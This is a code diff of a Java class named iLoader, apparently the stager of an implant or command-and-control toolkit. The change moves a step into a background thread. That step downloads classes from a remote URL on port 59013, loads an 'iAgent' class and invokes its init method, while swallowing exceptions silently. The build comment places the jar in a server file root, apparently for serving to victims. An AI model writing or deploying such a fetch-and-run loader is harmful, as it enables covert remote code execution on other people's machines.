@@ -112,7 +112,7 @@ public class iLoader
 
     //"C:\Program Files\Java\jdk1.8.0_202\bin\javac.exe" src\main\java\com\nocebo\nLoader\*.java
     //cd src\main\java
-    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\lib\iLoader.jar ..\..\..\MANIFEST.txt .\com\nocebo\nLoader\*.class
+    //"C:\Program Files\Java\jdk1.8.0_202\bin\jar.exe" cfm ..\..\..\..\server\fileroot\lib\iLoader.jar ..\..\..\MANIFEST.txt .\com\nocebo\nLoader\*.class
     public static void main(String[] args) throws Exception, IOException, UnmodifiableClassException, KeyManagementException, NoSuchAlgorithmException, InterruptedException, ClassNotFoundException, URISyntaxException, SocketException
     {
         Class currentClass = MethodHandles.lookup().lookupClass();
@@ -133,23 +133,24 @@ public class iLoader
         coreOp();
         System.out.println("finished core op");
 
-        URLClassLoader cLoader = downloadRequest(String.format("%s%s",urlData,"59013"));
-
-        Class initClass = cLoader.loadClass("com.nocebo.nCore.iAgent");
-        System.out.println(initClass.getName());
-        System.out.println(initClass.getMethod("init").getName());
+        
         Thread thread = new Thread(new Runnable() {
             @Override
             public void run() {
                 try {
+                    URLClassLoader cLoader = downloadRequest(String.format("%s%s",urlData,"59013"));
+
+                Class initClass = cLoader.loadClass("com.nocebo.nCore.iAgent");
                     Object initClassObj = initClass.newInstance();
                     initClass.getMethod("init").invoke(initClassObj);
-                } catch (Throwable e) {
+                } catch (NoSuchAlgorithmException | ClassNotFoundException |NoSuchMethodException | InstantiationException | IOException | URISyntaxException | InvocationTargetException | IllegalAccessException | KeyManagementException e) {
                     // exception handling
                 }
             }
         });
+        
         thread.start();
+        
     }
 
 
